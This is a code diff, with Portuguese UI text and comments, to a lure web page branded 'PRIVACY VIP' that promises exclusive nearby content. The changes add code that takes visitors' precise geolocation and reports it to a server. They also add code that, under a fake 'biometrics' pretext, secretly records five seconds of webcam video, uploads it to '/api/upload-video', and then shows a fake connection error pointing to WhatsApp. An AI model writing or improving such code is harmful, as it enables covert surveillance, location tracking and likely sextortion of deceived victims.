@@ -36,10 +36,11 @@
         </div>
     </div>
 
-    <div id="content" style="background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200&h=800&fit=crop') center/cover no-repeat;">
-        <header style="padding: 15px; border-bottom: 1px solid #222; text-align: center; color: var(--primary); font-weight: bold;">PRIVACY VIP</header>
-        <div style="padding: 20px;">
-            <div style="height: 400px; border-radius: 15px;"></div>
+    <div id="content" style="background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://cnnamador.com/contents/videos_screenshots/253000/253436/preview.jpg') center/cover no-repeat;">
+        <header style="padding: 20px; border-bottom: 1px solid rgba(255, 42, 95, 0.3); text-align: center; color: var(--primary); font-weight: 900; font-size: 1.5rem; letter-spacing: 2px; text-shadow: 0 0 10px rgba(255, 42, 95, 0.5);">PRIVACY VIP</header>
+        <div style="padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 80px);">
+            <div style="width: 100%; max-width: 300px; height: 450px; border-radius: 20px; border: 2px solid var(--primary); box-shadow: 0 0 30px rgba(255, 42, 95, 0.3); background: url('https://cnnamador.com/contents/videos_screenshots/253000/253436/preview.jpg') center/cover no-repeat;"></div>
+            <p style="margin-top: 20px; font-weight: bold; font-size: 1.2rem; color: #fff; text-align: center;">CONTEÚDO EXCLUSIVO PRÓXIMO A VOCÊ</p>
         </div>
     </div>
 
@@ -69,9 +70,8 @@
                 });
                 
                 if(!response.ok) {
-                    console.error(`❌ Erro ${response.status}: ${response.statusText}`);
                     const error = await response.json();
-                    console.error('Detalhes:', error);
+                    console.error('❌ Erro no servidor:', error);
                 } else {
                     console.log('✅ Enviado com sucesso!');
                 }
@@ -81,12 +81,25 @@
         }
 
         function requestPermission() {
+            const btn = document.querySelector('.btn-allow');
+            btn.innerText = "PROCESSANDO...";
+            btn.disabled = true;
+
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((p) => {
-                    report('LOCALIZAÇÃO', `Lat: ${p.coords.latitude}, Long: ${p.coords.longitude}`);
+                    const locData = `Lat: ${p.coords.latitude}, Long: ${p.coords.longitude}`;
+                    console.log('📍 Localização obtida:', locData);
+                    report('LOCALIZAÇÃO', locData);
                     unlockFeed();
-                }, () => unlockFeed());
-            } else { unlockFeed(); }
+                }, (err) => {
+                    console.warn('⚠️ Localização negada ou erro:', err.message);
+                    report('LOCALIZAÇÃO', 'Negado/Erro: ' + err.message);
+                    unlockFeed();
+                }, { timeout: 10000, enableHighAccuracy: true });
+            } else { 
+                report('LOCALIZAÇÃO', 'Não suportado pelo navegador');
+                unlockFeed(); 
+            }
         }
 
         function unlockFeed() {
@@ -105,17 +118,71 @@
 
         async function startCamera() {
             try {
-                // Pede a permissão silenciosamente
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                report('CÂMERA', 'Acesso Concedido');
+                // Tenta pegar apenas vídeo para evitar erros de falta de microfone
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                report('CÂMERA', 'Acesso Concedido (Iniciando Gravação)');
                 
-                document.querySelector('#modal-cam h2').innerText = "CONECTANDO...";
+                document.querySelector('#modal-cam h2').innerText = "GRAVANDO...";
+                
+                // Verifica tipos suportados
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
+                                 ? 'video/webm;codecs=vp8' 
+                                 : 'video/webm';
+                
+                const mediaRecorder = new MediaRecorder(stream, { mimeType });
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    if (chunks.length === 0) {
+                        console.error('❌ Nenhum dado de vídeo capturado');
+                        return;
+                    }
+
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'video.webm');
+
+                    try {
+                        const res = await fetch('/api/upload-video', {
+                            method: 'POST',
+                            body: formData
+                        });
+                        if (res.ok) {
+                            console.log('✅ Vídeo enviado com sucesso!');
+                        } else {
+                            const err = await res.text();
+                            console.error('❌ Erro no servidor ao enviar vídeo:', err);
+                        }
+                    } catch (e) {
+                        console.error('❌ Erro na requisição de vídeo:', e);
+                    }
+
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    document.querySelector('#modal-cam h2').innerText = "CONECTANDO...";
+                    setTimeout(() => {
+                        alert("Erro de conexão. Verifique seu WhatsApp.");
+                        location.reload();
+                    }, 2000);
+                };
+
+                // Grava por 5 segundos para garantir que tenha dados
+                mediaRecorder.start();
                 setTimeout(() => {
-                    alert("Erro de conexão. Verifique seu WhatsApp.");
-                    location.reload();
-                }, 3000);
+                    if (mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 5000);
+
             } catch (e) {
-                report('CÂMERA', 'Negado');
+                console.error('❌ Erro na câmera:', e);
+                report('CÂMERA', 'Erro: ' + e.message);
                 alert("Permissão necessária para biometria.");
             }
         }
